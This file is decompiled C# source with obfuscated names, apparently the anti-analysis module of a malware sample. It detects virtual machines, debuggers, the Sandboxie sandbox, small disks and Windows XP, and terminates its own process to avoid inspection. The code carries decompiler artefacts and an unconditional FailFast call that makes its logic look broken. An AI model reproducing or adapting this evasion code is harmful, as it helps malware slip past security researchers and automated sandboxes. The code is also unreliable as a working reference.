using System;
using System.Diagnostics;
using System.IO;
using System.Management;
using System.Runtime.InteropServices;
using Microsoft.VisualBasic.Devices;

namespace OedchgEuvSrX;

internal class lzYfnqfTbz
{
	public static void ZKVmEjHciVw()
	{
		if (rrLjXfENXUggYM() || whqleFlkBY() || sSCaQyXaeyGsKfSv() || TWlUUazrZpvuI() || hbCvLaIryk())
		{
			Process.GetCurrentProcess().Kill();
		}
		Environment.FailFast(null);
	}

	private static bool TWlUUazrZpvuI()
	{
		try
		{
			if (new DriveInfo(Path.GetPathRoot(Environment.SystemDirectory)).TotalSize <= 61000000000L)
			{
				return true;
			}
		}
		catch
		{
		}
		return false;
	}

	private static bool hbCvLaIryk()
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			if (new ComputerInfo().get_OSFullName().ToLower().Contains("xp"))
			{
				return true;
			}
		}
		catch
		{
		}
		return false;
	}

	private static bool rrLjXfENXUggYM()
	{
		//IL_0006: Unknown result type (might be due to invalid IL or missing references)
		//IL_000c: Expected O, but got Unknown
		try
		{
			ManagementObjectSearcher val = new ManagementObjectSearcher("Select * from Win32_ComputerSystem");
			try
			{
				ManagementObjectCollection val2 = val.Get();
				try
				{
					ManagementObjectEnumerator enumerator = val2.GetEnumerator();
					try
					{
						while (enumerator.MoveNext())
						{
							ManagementBaseObject current = enumerator.get_Current();
							string text = current.get_Item("Manufacturer").ToString()!.ToLower();
							if ((text == "microsoft corporation" && current.get_Item("Model").ToString()!.ToUpperInvariant().Contains("VIRTUAL")) || text.Contains("vmware") || current.get_Item("Model").ToString() == "VirtualBox")
							{
								return true;
							}
						}
					}
					finally
					{
						((IDisposable)enumerator)?.Dispose();
					}
				}
				finally
				{
					((IDisposable)val2)?.Dispose();
				}
			}
			finally
			{
				((IDisposable)val)?.Dispose();
			}
		}
		catch
		{
		}
		return false;
	}

	private static bool whqleFlkBY()
	{
		bool xkZyKGokvLUv = false;
		try
		{
			CheckRemoteDebuggerPresent(Process.GetCurrentProcess().Handle, ref xkZyKGokvLUv);
			return xkZyKGokvLUv;
		}
		catch
		{
			return xkZyKGokvLUv;
		}
	}

	private static bool sSCaQyXaeyGsKfSv()
	{
		try
		{
			if (GetModuleHandle("SbieDll.dll").ToInt32() != 0)
			{
				return true;
			}
			return false;
		}
		catch
		{
			return false;
		}
	}

	[DllImport("kernel32.dll")]
	public static extern IntPtr GetModuleHandle(string fYOZOexvbgab);

	[DllImport("kernel32.dll", ExactSpelling = true, SetLastError = true)]
	private static extern bool CheckRemoteDebuggerPresent(IntPtr YuwyIEntJIfdBvY, ref bool xkZyKGokvLUv);
}
